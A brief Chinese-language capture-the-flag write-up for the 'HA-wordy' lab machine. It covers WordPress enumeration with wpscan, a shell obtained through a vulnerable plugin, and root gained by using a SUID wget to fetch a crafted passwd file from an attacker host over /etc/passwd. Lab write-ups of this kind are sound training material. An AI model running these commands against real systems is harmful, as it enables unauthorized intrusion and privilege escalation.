# HA-wordy  
## 简述  
使用dirb发现其中的目录文件，然后使用wpscan对其进行密码爆破   
使用了带漏洞的插件，写入文件到用户表当中    
## 进入   
``` 
wpscan --url "http://192.168.1.57/wordpress" -e vp  
```
![20191203142121.png](https://i.loli.net/2019/12/03/J5aUfj1ZdFSExmt.png)  
![20191201132639.png](https://i.loli.net/2019/12/01/IMcJaOXy5ksiYn4.png)
查找到具有wordpress的页面  
使用wpscan查询其中的数据然后 使用wpscan进行搜索其中的内容  
使用wpscan查询其中的漏洞数据（貌似需要api所以看不到漏洞只能看到使用的插件）  
![20191201142002.png](https://i.loli.net/2019/12/01/9sGgjW1MCwkhoJE.png)
顺利拿到shell  
## 提权   
发现命令  
```  
find / -perm -u=s -type f 2>/dev/null
```
之后使用带s位的命令提权
使用linux当中的命令openssl生成数据  
openssl passwd -1 -salt username password
![20191201143050.png](https://i.loli.net/2019/12/01/1lJeIA8uPidX4rR.png)
然后将这段数据写到文件当中，在靶机上采用copy下载的方式（没有s位为什么能够替换数据）  
因为在查找权限的时候发现用户对wget具有命令
```
cd /home/raj
cd /etc
wget -O passwd http://192.168.0.16:8000/passwd
```
顺利拿到权限  
![20191201143556.png](https://i.loli.net/2019/12/01/e7YKCpAP4SG8WRI.png)  
因为之前在wordpress当中没有指定api所以导致不能找漏洞   
## 总结  
利用了漏洞插件，返回了shell,利用带有s位置的特殊命令进行提权  



